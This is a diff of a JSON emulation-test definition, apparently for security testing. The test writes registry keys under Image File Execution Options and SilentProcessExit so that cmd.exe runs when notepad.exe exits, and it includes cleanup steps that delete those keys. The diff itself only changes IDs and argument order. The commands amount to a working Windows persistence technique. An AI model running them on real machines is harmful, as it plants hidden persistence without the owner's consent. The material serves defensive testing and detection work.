@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "a28f5276-69cc-4d7d-9816-90ffe78bff31",
+      "id": "e3cb97ec-32c0-57de-9b8c-85b81685721e",
       "type": "execute-command",
       "data": {
         "command": "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v GlobalFlag /t REG_DWORD /d 512\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}\" /v ReportingMode /t REG_DWORD /d 1\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}\" /v MonitorProcess /d \"#{payload_binary}\"",
@@ -16,7 +16,7 @@
       "elevation_required": true
     },
     {
-      "id": "20783e4d-00fa-4559-a622-1fc8e8244a80",
+      "id": "9f23e202-2632-5aee-9493-f7468931d0ee",
       "type": "execute-command",
       "data": {
         "command": "reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v GlobalFlag /f \u003enul 2\u003e\u00261\nreg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}\" /v ReportingMode /f \u003enul 2\u003e\u00261\nreg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}\" /v MonitorProcess /f \u003enul 2\u003e\u00261",
@@ -27,14 +27,14 @@
   ],
   "flows": [
     {
-      "s": "a28f5276-69cc-4d7d-9816-90ffe78bff31",
+      "s": "e3cb97ec-32c0-57de-9b8c-85b81685721e",
       "p": "on-success",
-      "o": "20783e4d-00fa-4559-a622-1fc8e8244a80"
+      "o": "9f23e202-2632-5aee-9493-f7468931d0ee"
     },
     {
-      "s": "a28f5276-69cc-4d7d-9816-90ffe78bff31",
+      "s": "e3cb97ec-32c0-57de-9b8c-85b81685721e",
       "p": "on-failure",
-      "o": "20783e4d-00fa-4559-a622-1fc8e8244a80"
+      "o": "9f23e202-2632-5aee-9493-f7468931d0ee"
     }
   ],
   "tags": [
@@ -43,16 +43,16 @@
   ],
   "input_arguments": [
     {
-      "name": "payload_binary",
-      "type": "path",
-      "description": "Binary To Execute",
-      "value": "C:\\Windows\\System32\\cmd.exe"
-    },
-    {
       "name": "target_binary",
       "type": "path",
       "description": "Binary To Attach To",
       "value": "notepad.exe"
+    },
+    {
+      "name": "payload_binary",
+      "type": "path",
+      "description": "Binary To Execute",
+      "value": "C:\\Windows\\System32\\cmd.exe"
     }
   ]
 }
